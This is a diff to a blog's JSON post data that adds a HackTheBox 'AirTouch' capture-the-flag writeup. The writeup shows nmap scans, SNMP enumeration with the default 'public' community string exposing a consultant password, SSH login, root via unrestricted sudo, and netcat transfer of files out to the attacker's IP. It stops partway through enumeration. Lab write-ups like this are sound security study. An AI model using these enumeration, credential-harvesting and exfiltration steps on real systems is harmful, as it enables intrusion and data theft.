@@ -58,6 +58,7 @@
     "id": 2,
     "title": "Unforgettable Sunday Afternoon at the Shop",
     "date": "2025-01-10",
+    "disble":true,
     "content": [
       {
         "type": "paragraph",
@@ -118,7 +119,7 @@
   },
   {
     "id": 3,
-    "title": "CTF Writeup: Pickle Rick",
+    "title": "CTF Writeup: Pickle Rick [EASY]",
     "date": "2026-01-16",
     "content": [
       {
@@ -225,7 +226,7 @@
   },
   {
     "id": 4,
-    "title": "Box Writeup: Smag grotto",
+    "title": "Box Writeup: Smag grotto [EASY]",
     "date": "2026-01-17",
     "content": [
       {
@@ -356,6 +357,99 @@
         "type":"image",
         "alt":"Root Shell",
         "src":"/img/gif/closing_laptop.gif"
+      }
+    ]
+  },
+  {
+    "id": 5,
+    "title": "Box Writeup: Air Touch [MEDIUM]",
+    "date": "2026-01-17",
+    "content": [
+      {
+        "type":"paragraph",
+        "text":"Another box and first HackTheBox writeup. This is an medium difficulty box. Which drives me crazy for 2 days. But finally I get that..."
+      },
+      {
+        "type":"paragraph",
+        "text":"As usaly, I started with an Nmap scan to identify open ports and services running on the target machine."
+      },
+      {
+        "type":"code",
+        "text":"\u250c\u2500\u2500vemacitrind\u327fvemacitrind-[~/Documents/hackthebox/Machine/AirTouch]\n\u2514\u2500$ nmap -sVC -p 22 10.129.244.98  \nStarting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 19:28 IST\nNmap scan report for 10.129.244.98\nHost is up (0.34s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 bd:90:00:15:cf:4b:da:cb:c9:24:05:2b:01:ac:dc:3b (RSA)\n|   256 6e:e2:44:70:3c:6b:00:57:16:66:2f:37:58:be:f5:c0 (ECDSA)\n|_  256 ad:d5:d5:f0:0b:af:b2:11:67:5b:07:5c:8e:85:76:76 (ED25519)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.79 seconds"
+      },
+      {
+        "type":"image",
+        "alt":"person",
+        "src":"/img/gif/thinkingperson.png"
+      },
+      {
+        "type":"paragraph",
+        "text":"Hmmm...Only ssh port was open. I can't do much with only ssh port open and for sure i cannot bruteforce ssh without any username. So I decided to scan UDP ports as well."
+      },
+      {
+        "type":"code",
+        "text":"\u250c\u2500\u2500vemacitrind\u327fvemacitrind-[~/Documents/hackthebox/Machine/AirTouch]\n\u2514\u2500$ nmap -sU --top-ports 100 10.129.244.98 \n\nStarting Nmap 7.95 ( https://nmap.org ) at 2026-01-26 19:33 IST\nNmap scan report for 10.129.244.98\nHost is up (0.32s latency).\nNot shown: 98 closed udp ports (port-unreach)\nPORT    STATE         SERVICE\n68/udp  open|filtered dhcpc\n161/udp open          snmp\n\nNmap done: 1 IP address (1 host up) scanned in 111.43 seconds"
+      },
+      {
+        "type":"paragraph",
+        "text":"Ahh han SNMP port was open , but i don't know much about it. So I search basic snmp enumeration commands and found snmpwalk command. I runed it using default community string 'public'."
+      }
+      ,{
+        "type":"code",
+        "text":"\u250c\u2500\u2500vemacitrind\u327fvemacitrind-[~/Documents/hackthebox/Machine/AirTouch]\n\u2514\u2500$ snmpwalk -v2c -c public 10.129.244.98 \n\niso.3.6.1.2.1.1.1.0 = STRING: \"\"The default consultant password is: melody-khao-khud-janjao (change it after use it)\"\"\niso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10\niso.3.6.1.2.1.1.3.0 = Timeticks: (83831) 0:13:58.31\niso.3.6.1.2.1.1.4.0 = STRING: \"admin@AirTouch.htb\"\niso.3.6.1.2.1.1.5.0 = STRING: \"Consultant\"\niso.3.6.1.2.1.1.6.0 = STRING: \"\"Consultant pc\"\"\niso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1\niso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1\niso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1\niso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1\niso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1\niso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49\niso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4\niso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50\niso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3\niso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92\niso.3.6.1.2.1.1.9.1.3.1 = STRING: \"The SNMP Management Architecture MIB.\"\niso.3.6.1.2.1.1.9.1.3.2 = STRING: \"The MIB for Message Processing and Dispatching.\"\niso.3.6.1.2.1.1.9.1.3.3 = STRING: \"The management information definitions for the SNMP User-based Security Model.\"\niso.3.6.1.2.1.1.9.1.3.4 = STRING: \"The MIB module for SNMPv2 entities\"\niso.3.6.1.2.1.1.9.1.3.5 = STRING: \"View-based Access Control Model for SNMP.\"\niso.3.6.1.2.1.1.9.1.3.6 = STRING: \"The MIB module for managing TCP implementations\"\niso.3.6.1.2.1.1.9.1.3.7 = STRING: \"The MIB module for managing IP and ICMP implementations\"\niso.3.6.1.2.1.1.9.1.3.8 = STRING: \"The MIB module for managing UDP implementations\"\niso.3.6.1.2.1.1.9.1.3.9 = STRING: \"The MIB modules for managing SNMP Notification, plus filtering.\"\niso.3.6.1.2.1.1.9.1.3.10 = STRING: \"The MIB module for logging SNMP Notifications.\"\niso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00\niso.3.6.1.2.1.25.1.1.0 = Timeticks: (91116) 0:15:11.16\niso.3.6.1.2.1.25.1.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)"
+      },
+      {
+        "type":"paragraph",
+        "text":"Bingo! In the very first line I found the default password for 'Consultant' user is 'melody-khao-khud-janjao'."
+      },
+      {
+        "type":"paragraph",
+        "text":"I did ssh login using these credentials and I was in. and run `ls -al` to gain user flag."
+      },
+      {
+        "type":"code",
+        "text":"consultant@AirTouch-Consultant:~$ ls -al\ntotal 888\ndrwxr-xr-x 1 consultant consultant   4096 Jan 26 14:13 .\ndrwxr-xr-x 1 root       root         4096 Jan 13 14:55 ..\nlrwxrwxrwx 1 consultant consultant      9 Mar 27  2024 .bash_history -> /dev/null\n-rw-r--r-- 1 consultant consultant    220 Feb 25  2020 .bash_logout\n-rw-r--r-- 1 consultant consultant   3771 Feb 25  2020 .bashrc\ndrwx------ 2 consultant consultant   4096 Jan 26 14:13 .cache\n-rw-r--r-- 1 consultant consultant    807 Feb 25  2020 .profile\n-rw-r--r-- 1 consultant consultant 131841 Mar 27  2024 diagram-net.png\n-rw-r--r-- 1 consultant consultant 743523 Mar 27  2024 photo_2023-03-01_22-04-52.png"
+      },
+      {
+        "type":"paragraph",
+        "text":"There was no user flag in home directory. And as per second rule of my dictionary, I check sudo perivilages using `sudo -l`."
+      },
+      {
+        "type":"code",
+        "text":"\u250c\u2500\u2500vemacitrind\u327fvemacitrind-[~/Documents/hackthebox/Machine/AirTouch]\n\u2514\u2500$ ls\na  diagram-net.png  steps.txt\n\nconsultant@AirTouch-Consultant:~$ sudo -l\nMatching Defaults entries for consultant on AirTouch-Consultant:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser consultant may run the following commands on AirTouch-Consultant:\n    (ALL) NOPASSWD: ALL"
+      },
+      {
+        "type":"image",
+        "alt":"excited kid",
+        "src":"/img/gif/speed.gif"
+      },
+      {
+        "type":"paragraph",
+        "text":"At that moment, I realized that i'm *COOKED* becuase no way a medium box will have such an easy privesc. I got root shell using `sudo su`. I checked /root directory and found nothing."
+      },
+      {
+        "type":"paragraph",
+        "text":"Very next thing, I get two images in consultant home directory using nc."
+      },
+      {
+        "type":"code",
+        "text":"(Terminal 1 - Receiving the file)\n\u250c\u2500\u2500vemacitrind\u327fvemacitrind-[~/Documents/hackthebox/Machine/AirTouch]\n\u2514\u2500$ nc -l -p 4444 > diagram-net.png\n\n(Terminal 2 - Sending the file)\nconsultant@AirTouch-Consultant:~$ nc 10.10.15.108 4444 < diagram-net.png \n^C\n"
+      },
+      {
+        "type":"paragraph",
+        "text":"Same for other image as well. And here is our images:"
+      },
+      {
+        "type":"parse",
+        "html":"<div style=\"all: initial; display: flex; justify-content: center; gap: 12px;\"><img src=\"/img/blog/5/diagram-net.png\" alt=\"Image 1\" style=\"height: 200px; width: auto; object-fit: cover; border-radius: 6px; border: 1px solid #ccc;\" /><img src=\"/img/blog/5/photo.png\" alt=\"Image 2\" style=\"height: 200px; width: auto; object-fit: cover; border-radius: 6px; border: 1px solid #ccc;\" /></div>"
+      },
+      {
+        "type":"paragraph",
+        "text":"Okay, From the diagram image, I can see there is an Interprise network with 3 VLANs. This box is more about how a single VLAN can cause a big security issue in entire network."
+      },
+      {
+        "type":"parse",
+        "html":"<div><p>And for the flags it it's hidden in somewhere in the system [<a href=\"https://attack.mitre.org/techniques/T1005/\" style=\"text-decoration: underline;\">MITREATT&CK</a>]</p></div>"
       }
     ]
   }
